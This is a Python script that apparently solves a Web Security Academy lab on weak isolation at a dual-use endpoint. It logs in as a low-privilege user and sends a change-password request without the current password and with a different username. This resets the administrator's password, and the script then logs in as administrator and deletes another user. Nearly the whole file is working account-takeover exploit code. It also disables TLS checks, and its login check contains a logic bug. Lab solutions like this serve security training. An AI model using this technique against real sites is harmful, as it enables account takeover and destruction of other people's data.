import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name': 'csrf'})['value']
    return csrf_token


def delete_user(s, url):
    # LOGIN AS USER 'WIENER'
    print("[+] Logging-in as the user wiener...")
    login_url = url + "/login"
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)

    # CHECK IF LOGIN WAS SUCCESSFUL
    if "Log out" and "wiener" not in r.text:
        print("[-] Error! Exiting the script!")
        sys.exit(-1)

    print("[+] Logged-in successfully!")

    # CHANGE THE PASSWORD FOR THE USER 'ADMINISTRATOR'
    print("[+] Here comes the exploit!")
    print("[+] The 'Change password' function requires 5 arguments which are...")
    print("[+] - a csrf token\n[+] - a valid username\n[+] - the current password\n[+] - the new password\n[+] - the new password again")
    print("[+] But here comes the magic... sending a request without the current password... works! The password changes and we can even specify usernames of other users...")
    print("[+] So let's change the password for the user administrator!")
    myaccount_url = url + "/my-account"
    change_psw_url = url + "/my-account/change-password"
    params = {
        'csrf' : get_csrf(s, myaccount_url),
        'username' : 'administrator',
        'new-password-1' : 'newpsw',
        'new-password-2' : 'newpsw'
    }
    r = s.post(change_psw_url, data=params, verify=False, proxies=proxies)
    if "Password changed successfully!" not in r.text:
        print("[-] Could not change the password!")
        sys.exit(-1)
    
    print("[+] Password changed!")

    # LOGIN AS USER 'ADMINISTRATOR'
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'administrator',
        'password' : 'newpsw'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    if "Admin panel" not in r.text:
        print("[-] Something went wrong! Exiting the script...")
        sys.exit(-1)

    print("[+] Logged-in as user administrator!")

    # DELETE USER 'CARLOS'
    delete_url = url + "/admin/delete?username=carlos"
    r = s.get(delete_url, verify=False, proxies=proxies)
    if "User deleted successfully!" not in r.text:
        print("[-] Carlos is too strong and I cannot delete it!")
        sys.exit(-1)

    print("[+] User carlos deleted!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("[+] Lab: Weak isolation on dual-use endpoint")
    print("""[+] This lab makes a flawed assumption about the user's privilege level based on their input.
    As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts.
    To solve the lab, access the administrator account and delete Carlos.
    
    You can log in to your own account using the following credentials: wiener:peter""")

    delete_user(s, url)



if __name__ == "__main__":
    main()